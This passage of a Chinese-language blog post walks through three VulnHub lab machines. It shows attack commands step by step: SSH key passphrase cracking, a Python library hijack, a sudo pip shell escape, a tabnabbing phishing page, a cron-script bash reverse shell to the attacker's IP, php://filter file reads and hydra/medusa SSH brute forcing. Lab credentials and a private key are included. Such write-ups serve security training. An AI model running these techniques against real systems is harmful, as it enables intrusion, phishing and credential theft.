class="hljs-number">59</span>RdhrDr<span class="hljs-number">71</span>Z<span class="hljs-number">3</span>zgQkAs<span class="hljs-number">8</span>uPM<span class="hljs-name">M1</span>JPvM<span class="hljs-symbol">NgdyNzpgEGGgj9</span>czgBa<span class="hljs-symbol">N5</span>PWrpPBWft<span class="hljs-name">g9</span>fte<span class="hljs-number">4</span>xYyvJ<span class="hljs-number">1</span>BF<span class="hljs-symbol">N5</span>WDvTYfhUtc<span class="hljs-symbol">n1</span>oRTDow<span class="hljs-number">67</span>w<span class="hljs-number">5</span>zz<span class="hljs-number">3</span>adjLD<span class="hljs-symbol">nXLQc6</span>MaowZJ<span class="hljs-number">2</span>zyh<span class="hljs-number">4</span>PAc<span class="hljs-number">1</span>vpstCRtKQt<span class="hljs-number">35</span>JEdwfwUe<span class="hljs-number">4</span>wz<span class="hljs-symbol">Nr3</span>sidChW<span class="hljs-number">8</span>VuMU<span class="hljs-number">1</span>Lz<span class="hljs-number">1</span>cAj<span class="hljs-attr">vcVHEp1</span>Sab<span class="hljs-meta">o8</span>FprJwJgRs<span class="hljs-number">5</span>ZPA<span class="hljs-number">7</span>Ve<span class="hljs-number">6</span>LDW<span class="hljs-number">7</span>hFa<span class="hljs-symbol">ngK8</span>YwZmRCmXxArBFVwjfV<span class="hljs-number">2</span>SjyhTjhdqswJE<span class="hljs-number">5</span><span class="hljs-symbol">nP6</span>pV<span class="hljs-symbol">nshbV8</span>Zq<span class="hljs-name">G2</span>L<span class="hljs-number">8</span>d<span class="hljs-number">1</span>cwhxpxggmu<span class="hljs-number">1</span>jByELxVHF<span class="hljs-number">1</span>C<span class="hljs-number">9</span>T<span class="hljs-number">3</span>GgLDvgUv<span class="hljs-number">8</span><span class="hljs-symbol">nc7</span>PEJYoXpCoyCs<span class="hljs-number">55</span>r<span class="hljs-number">35</span>h<span class="hljs-number">9</span>YzfKgjcJkvFTdfPHwW<span class="hljs-number">8</span>fSjCVBuUTKSEAvkRr<span class="hljs-number">6</span>iLj<span class="hljs-number">6</span>H<span class="hljs-number">4</span>LEjB<span class="hljs-name">g256</span><span class="hljs-name">G4</span>DHHqpwTgYFtejc<span class="hljs-number">8</span><span class="hljs-symbol">nLX77</span>LUoVmACLvfC<span class="hljs-number">439</span>jtVdxCtYA<span class="hljs-number">6</span>y<span class="hljs-number">2</span>vj<span class="hljs-number">7</span>ZDeX<span class="hljs-number">7</span>zp<span class="hljs-number">2</span>VYR<span class="hljs-number">89</span>GmSqEWj<span class="hljs-number">3</span>doqdahv<span class="hljs-number">1</span>DktvtQcRBiizMg<span class="hljs-symbol">NWYsjMWRM4</span>BPSc<span class="hljs-symbol">nn92</span><span class="hljs-symbol">ncLD1</span>Bw<span class="hljs-number">5</span>ioB<span class="hljs-number">8</span><span class="hljs-symbol">NyZ9</span>C<span class="hljs-symbol">NkMNk4</span>Pf<span class="hljs-number">7</span>Uqa<span class="hljs-number">7</span><span class="hljs-attr">vCTgw4</span>VJv<span class="hljs-attr">vSjE6</span>PRF<span class="hljs-symbol">nqDSrg4</span>avGUqeMUm<span class="hljs-symbol">ngc5</span>m<span class="hljs-symbol">N6</span>WEa<span class="hljs-number">3</span>pxHpkh<span class="hljs-name">G8</span>Z<span class="hljs-symbol">ngCqKvVhegBAVi7</span><span class="hljs-symbol">nDBTwukqEDeCS46</span>UczhXMFbAg<span class="hljs-symbol">nQWhExas547</span><span class="hljs-attr">vCXho71</span>gcmVqu<span class="hljs-number">2</span>x<span class="hljs-number">5</span>EAPFgJqyvMmRScQxiKrYoK<span class="hljs-number">3</span>p<span class="hljs-number">279</span>KLAyS<span class="hljs-name">M4</span>v<span class="hljs-symbol">NcRxrRrR2</span>DYQwhe<span class="hljs-number">8</span>Yj<span class="hljs-symbol">Nsf8</span>MzqjX<span class="hljs-number">54</span>mhbWcjz<span class="hljs-number">3</span>jeXoko<span class="hljs-symbol">nVk77</span>P<span class="hljs-number">9</span><span class="hljs-name">g9</span>y<span class="hljs-number">69</span>DVzJeYUvfX<span class="hljs-attr">VCjPWi7</span>aDDA<span class="hljs-number">7</span>HdQd<span class="hljs-number">2</span>UpCghEGtWSfEJtDgPxurPq<span class="hljs-number">8</span>qJQh<span class="hljs-number">3</span><span class="hljs-symbol">N75</span>YF<span class="hljs-number">8</span>KeQzJs<span class="hljs-number">77</span>Tpwcdv<span class="hljs-number">2</span>Wuvi<span class="hljs-number">1</span>L<span class="hljs-number">5</span>ZZtppbWymsgZckW<span class="hljs-symbol">nkg5</span><span class="hljs-symbol">NB9</span>Pp<span class="hljs-number">5</span>izVXCiFhobqF<span class="hljs-number">2</span>vd<span class="hljs-number">2</span>jh<span class="hljs-name">g4</span>rcpLZ<span class="hljs-symbol">nGdmmEotL7</span>CfRdVwUWpVppHRZzq<span class="hljs-number">7</span>FEQQFxkRL<span class="hljs-number">7</span>JzGoL<span class="hljs-number">8</span>R<span class="hljs-number">8</span>wQ<span class="hljs-name">G1</span>UyB<span class="hljs-symbol">NKPBbVnc7</span>jGyJqFuj<span class="hljs-attr">vCLt6</span>yMUEYXKQTipmEhx<span class="hljs-number">4</span>rXJZK<span class="hljs-number">3</span>aKdbucKhGqMYMH<span class="hljs-symbol">nVbtpLrQUaPZHsiNGUcEd64</span>KW<span class="hljs-number">5</span>kZ<span class="hljs-number">7</span>svohTC<span class="hljs-number">5</span>i<span class="hljs-number">4</span>L<span class="hljs-number">4</span>TuEzRZEyWy<span class="hljs-number">6</span>v<span class="hljs-number">2</span>GGiEp<span class="hljs-number">4</span>Mf<span class="hljs-number">2</span>oEHMUwqto<span class="hljs-symbol">NXbsGp8</span>sbJbZATFLXVbP<span class="hljs-number">3</span>PgBw<span class="hljs-number">8</span>rgAakz<span class="hljs-number">7</span>QBFAGryQ<span class="hljs-number">3</span>t<span class="hljs-symbol">nxytWNuHWkPohMMKUiDFeRyLi8</span>HGUdocwZFzdkbffv<span class="hljs-meta">o8</span>HaewPYF<span class="hljs-symbol">NsPDCn1</span>PwgS<span class="hljs-number">8</span>wA<span class="hljs-number">9</span>agCX<span class="hljs-number">5</span>kZbKWBmU<span class="hljs-number">2</span>zpCstqFAxXeQd<span class="hljs-number">8</span>LiwZzPdsbF<span class="hljs-number">2</span>YZEKz<span class="hljs-symbol">NYtckW5</span>RrFa<span class="hljs-number">5</span>zDgK<span class="hljs-name">m2</span>gSR<span class="hljs-symbol">N8</span>gHz<span class="hljs-number">3</span>WqS<br></code></pre></td></tr></table></figure><ol start="7"><li>base58解密后得到密钥</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs bash">-----BEGIN OPENSSH PRIVATE KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jYmMAAAAGYmNyeXB0AAAAGAAAABDy33c2Fp<br>PBYANne4oz3usGAAAAEAAAAAEAAAIXAAAAB3NzaC1yc2EAAAADAQABAAACAQDBzHjzJcvk<br>9GXiytplgT9z/mP91NqOU9QoAwop5JNxhEfm/j5KQmdj/JB7sQ1hBotONvqaAdmsK+OYL9<br>H6NSb0jMbMc4soFrBinoLEkx894B/PqUTODesMEV/aK22UKegdwlJ9Arf+1Y48V86gkzS6<br>xzoKn/ExVkApsdimIRvGhsv4ZMmMZEkTIoTEGz7raD7QHDEXiusWl0hkh33rQZCrFsZFT7<br>J0wKgLrX2pmoMQC6o42OQJaNLBzTxCY6jU2BDQECoVuRPL7eJa0/nRfCaOrIzPfZ/NNYgu<br>/Dlf1CmbXEsCVmlD71cbPqwfWKGf3hWeEr0WdQhEuTf5OyDICwUbg0dLiKz4kcskYcDzH0<br>ZnaDsmjoYv2uLVLi19jrfnp/tVoLbKm39ImmV6Jubj6JmpHXewewKiv6z1nNE8mkHMpY5I<br>he0cLdyv316bFI8O+3y5m3gPIhUUk78C5n0VUOPSQMsx56d+B9H2bFiI2lo18mTFawa0pf<br>XdcBVXZkouX3nlZB1/Xoip71LH3kPI7U7fPsz5EyFIPWIaENsRmznbtY9ajQhbjHAjFClA<br>hzXJi4LGZ6mjaGEil+9g4U7pjtEAqYv1+3x8F+zuiZsVdMr/66Ma4e6iwPLqmtzt3UiFGb<br>4Ie1xaWQf7UnloKUyjLvMwBbb3gRYakBbQApoONhGoYQAAB1BkuFFctACNrlDxN180vczq<br>mXXs+ofdFSDieiNhKCLdSqFDsSALaXkLX8DFDpFY236qQE1poC+LJsPHJYSpZOr0cGjtWp<br>MkMcBnzD9uynCjhZ9ijaPY/vMY7mtHZNCY8SeoWAxYXToKy2cu/+pVyGQ76KYt3J0AT7wA<br>2OR3aMMk0o1LoozuyvOrB3cXMHh75zBfgQyAeeD7LyYG/b7z6zGvVxZca/g572CXxXSXlb<br>QOw/AR8ArhAP4SJRNkFoV2YRCe38WhQEp4R6k+34tK+kUoEaVAbwU+IchYyM8ZarSvHVpE<br>vFUPiANSHCZ/b+pdKQtBzTk5/VH/Jk3QPcH69EJyx8/gRE/glQY6z6nC6uoG4AkIl+gOxZ<br>0hWJJv0R1Sgrc91mBVcYwmuUPFRB5YFMHDWbYmZ0IvcZtUxRsSk2/uWDWZcW4tDskEVPft<br>rqE36ftm9eJ/nWDsZoNxZbjo4cF44PTF0WU6U0UsJW6mDclDko6XSjCK4tk8vr4qQB8OLB<br>QMbbCOEVOOOm9ru89e1a+FCKhEPP6LfwoBGCZMkqdOqUmastvCeUmht6a1z6nXTizommZy<br>x+ltg9c9xfeO8tg1xasCel1BluIhUKwGDkLCeIEsD1HYDBXb+HjmHfwzRipn/tLuNPLNjG<br>nx9LpVd7M72Fjk6lly8KUGL7z95HAtwmSgqIRlN+M5iKlB5CVafq0z59VB8vb9oMUGkCC5<br>VQRfKlzvKnPk0Ae9QyPUzADy+gCuQ2HmSkJTxM6KxoZUpDCfvn08Txt0dn7CnTrFPGIcTO<br>cNi2xzGu3wC7jpZvkncZN+qRB0ucd6vfJ04mcT03U5oq++uyXx8t6EKESa4LXccPGNhpfh<br>nEcgvi6QBMBgQ1Ph0JSnUB7jjrkjqC1q8qRNuEcWHyHgtc75JwEo5ReLdV/hZBWPD8Zefm<br>8UytFDSagEB40Ej9jbD5GoHMPBx8VJOLhQ+4/xuaairC7s9OcX4WDZeX3E0FjP9kq3QEYH<br>zcixzXCpk5KnVmxPul7vNieQ2gqBjtR9BA3PqCXPeIH0OWXYE+LRnG35W6meqqQBw8gSPw<br>n49YlYW3wxv1G3qxqaaoG23HT3dxKcssp+XqmSALaJIzYlpnH5Cmao4eBQ4jv7qxKRhspl<br>AbbL2740eXtrhk3AIWiaw1h0DRXrm2GkvbvAEewx3sXEtPnMG4YVyVAFfgI37MUDrcLO93<br>oVb4p/rHHqqPNMNwM1ns+adF7REjzFwr4/trZq0XFkrpCe5fBYH58YyfO/g8up3DMxcSSI<br>63RqSbk60Z3iYiwB8iQgortZm0UsQbzLj9i1yiKQ6OekRQaEGxuiIUA1SvZoQO9NnTo0SV<br>y7mHzzG17nK4lMJXqTxl08q26OzvdqevMX9b3GABVaH7fsYxoXF7eDsRSx83pjrcSd+t0+<br>t/YYhQ/r2z30YfqwLas7ltoJotTcmPqII28JpX/nlpkEMcuXoLDzLvCZORo7AYd8JQrtg2<br>Ays8pHGynylFMDTn13gPJTYJhLDO4H9+7dZy825mkfKnYhPnioKUFgqJK2yswQaRPLakHU<br>yviNXqtxyqKc5qYQMmlF1M+fSjExEYfXbIcBhZ7gXYwalGX7uX8vk8zO5dh9W9SbO4LxlI<br>8nSvezGJJWBGXZAZSiLkCVp08PeKxmKN2S1TzxqoW7VOnI3jBvKD3IpQXSsbTgz5WB07BU<br>mUbxCXl1NYzXHPEAP95Ik8cMB8MOyFcElTD8BXJRBX2I6zHOh+4Qa4+oVk9ZluLBxeu22r<br>VgG7l5THcjO7L4YubiXuE2P7u77obWUfeltC8wQ0jArWi26x/IUt/FP8Nq964pD7m/dPHQ<br>E8/oh4V1NTGWrDsK3AbLk/MrgROSg7Ic4BS/8IwRVuC+d2w1Pq+X+zMkblEpD49IuuIazJ<br>BHk3s6SyWUhJfD6u4C3N8zC3Jebl6ixeVM2vEJWZ2Vhcy+31qP80O/+Kk9NUWalsz+6Kt2<br>yueBXN1LLFJNRVMvVO823rzVVOY2yXw8AVZKOqDRzgvBk1AHnS7r3lfHWEh5RyNhiEIKZ+<br>wDSuOKenqc71GfvgmVOUypYTtoI527fiF/9rS3MQH2Z3l+qWMw5A1PU2BCkMso060OIE9P<br>5KfF3atxbiAVii6oKfBnRhqM2s4SpWDZd8xPafktBPMgN97TzLWM6pi0NgS+fJtJPpDRL8<br>vTGvFCHHVi4SgTB64+HTAH53uQC5qizj5t38in3LCWtPExGV3eiKbxuMxtDGwwSLT/DKcZ<br>Qb50sQsJUxKkuMyfvDQC9wyhYnH0/4m9ahgaTwzQFfyf7DbTM0+sXKrlTYdMYGNZitKeqB<br>1bsU2HpDgh3HuudIVbtXG74nZaLPTevSrZKSAOit+Qz6M2ZAuJJ5s7UElqrLliR2FAN+gB<br>ECm2RqzB3Huj8mM39RitRGtIhejpsWrDkbSzVHMhTEz4tIwHgKk01BTD34ryeel/4ORlsC<br>iUJ66WmRUN9EoVlkeCzQJwivI=<br>-----END OPENSSH PRIVATE KEY-----<br></code></pre></td></tr></table></figure><ol start="8"><li>现在我们拿到了私钥，还知道用户名icex64，尝试直接ssh私钥登录失败，搜索得知，可以利用<code>john</code>工具从私钥中爆破出用户密码</li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">python <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/john/</span>ssh2john.py id_rsa &gt; aaaa<br>john aaaa<br></code></pre></td></tr></table></figure><ol start="9"><li><img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231007113740113.png" alt="image-20231007113740113"></li><li>给我kali的CPU拉满了hhh</li></ol><p><img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231007140821096.png" alt="image-20231007140821096"></p><ol start="11"><li><p>现在ssh登录靶机，这里不知道什么原因一直错误，于是拯救模式登进靶机把密码重置了<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231007141912495.png" alt="image-20231007141912495"></p></li><li></li></ol><p>接下来尝试提权<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231007142111784.png" alt="image-20231007142111784"></p><ol start="13"><li>这就很简单了，修改&#x2F;home&#x2F;arsene&#x2F;beist.py 文件，写入提权代码，python运行即可</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pty<br>pty.spawn(<span class="hljs-string">&#x27;/bin/bash&#x27;</span>)<br></code></pre></td></tr></table></figure><ol start="14"><li>查看权限发现该脚本文件只能看不能修改，但是脚本文件执行了webbrowser库的open函数</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> webbrowser<br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;Its not yet ready to get in action&quot;</span>)<br>webbrowser.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;https://empirecybersecurity.co.mz&quot;</span>)<br></code></pre></td></tr></table></figure><ol start="15"><li>查看webbrowser库，发现任意用户可写入，于是修改open函数，添加<code>os.system(&#39;/bin/bash&#39;)</code>, 运行heist.py文件，得到arsene用户的shell</li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo -u arsene <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/python3.9 /</span>home<span class="hljs-regexp">/arsene/</span>heist.py<br></code></pre></td></tr></table></figure><p><img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231007144216893.png" alt="image-20231007144216893"></p><ol start="16"><li>下一步sudo pip提权</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">TF=$(<span class="hljs-built_in">mktemp</span> -d)<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;import os; os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh &lt;<span class="hljs-subst">$(tty)</span> &gt;<span class="hljs-subst">$(tty)</span> 2&gt;<span class="hljs-subst">$(tty)</span>&#x27;)&quot;</span> &gt; <span class="hljs-variable">$TF</span>/setup.py<br>sudo pip install <span class="hljs-variable">$TF</span><br></code></pre></td></tr></table></figure><ol start="17"><li>交互式shell</li></ol><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">pytho<span class="hljs-symbol">n3</span> -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure><h3 id="napping-1-0-1"><a href="#napping-1-0-1" class="headerlink" title="napping-1.0.1"></a>napping-1.0.1</h3><ol><li><p>扫ip，端口发现22 8080</p></li><li><p>8080上运行一个登陆页面和一个输入框，管理员会点击我们输入的网址<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231008121235017.png" alt="image-20231008121235017"></p></li><li><p>搜索得知此处可以利用 <code>标签钓鱼</code> 即 <code>TabNapping</code> ，我们利用kali上的一款社工工具 <code>setoolkit</code>，创建一个标签钓鱼网站</p></li></ol><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams">此处调试软件废了不少功夫，大概的报错有两个：urllib has <span class="hljs-keyword">no</span> attribution named <span class="hljs-string">&#x27;urlopen&#x27;</span>; result <span class="hljs-number">404</span><br>搜索得到的解决方法为将 /usr/share/<span class="hljs-keyword">set</span>/src/webattack/tabnabbing/tabnabbing.py 中的<span class="hljs-comment">urllib.urlopen</span> 改为 <span class="hljs-comment">urllib.request.urlopen</span>， 并注释后续的五行代码<br>原理：python2中的 urllib 库存在<span class="hljs-comment">urlopen</span>方法，但是<span class="hljs-comment">python3</span>中将这个方法放在了<span class="hljs-comment">urllib.reequest</span>下；<span class="hljs-comment">404</span>的原因是目标网站可能并不存在图标，这里可以选择直接删除图标，也可以先判断是否存在再决定要不要添加图标<br></code></pre></td></tr></table></figure><p><img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231008121558813.png" alt="image-20231008121558813"></p><ol start="4"><li>再自己写一个跳转网页，用python开一个http服务，把这个网页的url写进输入框，让管理员点击就会跳转到我们上面的钓鱼网站</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">boby</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">if</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">opener</span>) <span class="hljs-variable language_">window</span>.<span class="hljs-property">opener</span>.<span class="hljs-property">parent</span>.<span class="hljs-property">location</span>.<span class="hljs-title function_">replace</span>(<span class="hljs-string">&#x27;http://192.168.1.15&#x27;</span>);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231008123855027.png" alt="image-20231008123855027"></p><ol start="5"><li>ok，成功拿到管理员账号密码，我们尝试ssh登录，成功</li></ol><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> daniel@<span class="hljs-number">192.168.1.33</span><br>password=C<span class="hljs-variable">@ughtm3napping123</span><br></code></pre></td></tr></table></figure><p><img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231008131000426.png" alt="image-20231008131000426"></p><ol start="6"><li>接下来开始提权，sudo被禁用，查看可执行文件，发现在&#x2F;home&#x2F;adrian&#x2F;下存在一个py脚本文件，内容大概是记录日志，我们可以直接修改，查看日志发现两分钟执行一次，我们修改脚本代码为</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br>os.system(<span class="hljs-string">&quot;/usr/bin/bash -c &#x27;/usr/bin/bash -i &gt;&amp; /dev/tcp/192.168.1.15/8888&#x27; 0&gt;&amp;1&quot;</span>)<br></code></pre></td></tr></table></figure><ol start="7"><li><p>同时在kali(192.168.1.15)监听8888端口，过了两分钟，成功拿到adrian的shell<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231008133315836.png" alt="image-20231008133315836"></p></li><li><p>接下来利用adrian提权，查看sudo -l<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231008133359694.png" alt="image-20231008133359694"></p></li><li><p>ok ，sudo vim提权<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231008133645461.png" alt="image-20231008133645461"></p></li></ol><h3 id="red1"><a href="#red1" class="headerlink" title="red1"></a>red1</h3><ol><li><p>扫ip，端口发现，开放了22，80；其中80端口运行wordpress</p></li><li><p>dirb扫目录，同时自己点进主页查看，发现存在一个域名 <code>redrocks.win</code> ，修改hosts文件将域名地址导向<code>192.168.448.135</code> </p></li><li><p>咱们做两手准备，一方面用wpscan扫漏洞和爆破用户名密码，发现用户 <code>administrator</code> ，用rockyou字典进行密码爆破；另一方面读网页源码，发现提示 <code>Mr.miessler</code> ，经过搜索发现有个相关github项目中有php后门字典，我们利用 <code>dirb</code> 发现一个php后门 <code> /NetworkFileManagerPHP.php</code></p></li><li><p>访问 <code> /NetworkFileManagerPHP.php</code> 无回显，利用 <code>ffuf</code> 尝试爆破参数</p></li></ol><p>（这个过程中由于请求过快，导致靶机崩溃了，尝试了好几次都有问题😂）<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231019145058250.png" alt="image-20231019145058250"></p><ol start="5"><li><p>改用burp来爆破参数，这里用的字典<code>D:\tools\fuzzDicts-master\paramDict\parameter.txt</code><img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231019154450410.png" alt="image-20231019154450410"></p></li><li><p>接下来测试这个后门是什么功能，已经输入的命令 <code>ls</code> ，无效，尝试输入一个文件地址 <code>/etc/passwd</code> ，很好，任意文件读取<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231019154846474.png" alt="image-20231019154846474"></p></li><li><p>我们来测试一下是不是文件包含漏洞，使用</p></li></ol><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">?<span class="hljs-built_in">key</span>=php://filter/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.<span class="hljs-built_in">base64</span>-encode/resource=NetworkFileManagerPHP.php<br></code></pre></td></tr></table></figure><p><img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231019155326248.png" alt="image-20231019155326248"></p><ol start="8"><li><p>那好办了，解码后看看有没有过滤<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231019155445880.png" alt="image-20231019155445880"></p></li><li><p>有点东西，虽然没有过滤，但是还有个注释，我们再解码一次</p></li></ol><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">VGhhdCBwYXNzd29yZCBhbG9uZSB3b24ndCBoZWxwIHlvdSEgSGFzaGNhdCBzYXlzIHJ1bGVzIGFyZSBydWxlcw</span>==<br>That password alone won<span class="hljs-string">&#x27;t help you! Hashcat says rules are rules</span><br></code></pre></td></tr></table></figure><ol start="10"><li>读取wp-config.php</li></ol><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.base64-encode/resource=wp-config.php<br></code></pre></td></tr></table></figure><p><img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231019161033785.png" alt="image-20231019161033785"></p><p>拿到账号 <code>john</code> 密码 <code>R3v_m4lwh3r3_k1nG!!</code>，直接尝试ssh，失败，密码错误</p><ol start="11"><li>之前的注释提示要用hashcat的rule，我们bing一下</li></ol><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">先将我们的密码放进一个base.txt文件，然后运行以下指令<br>hashcat <span class="hljs-attr">--stdout</span> base<span class="hljs-selector-class">.txt</span> -r /usr/share/hashcat/rules/best64<span class="hljs-selector-class">.rule</span> -o password.txt<br></code></pre></td></tr></table></figure><p><img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231019161907131.png" alt="image-20231019161907131"></p><ol start="12"><li>接下来我们用九头蛇或者美杜莎进行ssh爆破</li></ol><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">九头蛇：<br>hydra -l john -P password<span class="hljs-selector-class">.txt</span> ssh:<span class="hljs-comment">//192.168.48.135</span><br>美杜莎：<br>medusa -h <span class="hljs-number">192.168</span>.<span class="hljs-number">48.135</span> -u john -P password<span class="hljs-selector-class">.txt</span> -M ssh<br></code></pre></td></tr></table></figure><p><img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231019162547602.png" alt="image-20231019162547602"></p><p><img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231019162610010.png" alt="image-20231019162610010"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span> john@<span class="hljs-number">192.168.48.135</span><br><span class="hljs-attribute">R3v_m4lwh3r3_k1nG</span>!!<span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><ol><li><p>ssh登录成功，但是刚连上就被踢掉了<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231019162750514.png" alt="image-20231019162750514"></p></li><li><p>我们重新爆破，发现密码已经被改<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231019162857617.png" alt="image-20231019162857617"></p></li><li><p>再次尝试ssh连接，发现了一张给蓝队的小纸条，告诉我们<code>cat</code> 指令有问题(早就发现了，cat和vim互换)，同时 <code>sudo -l</code> 发现用户 <code>ippsec</code>可执行命令<code>usr/bin/time</code><img 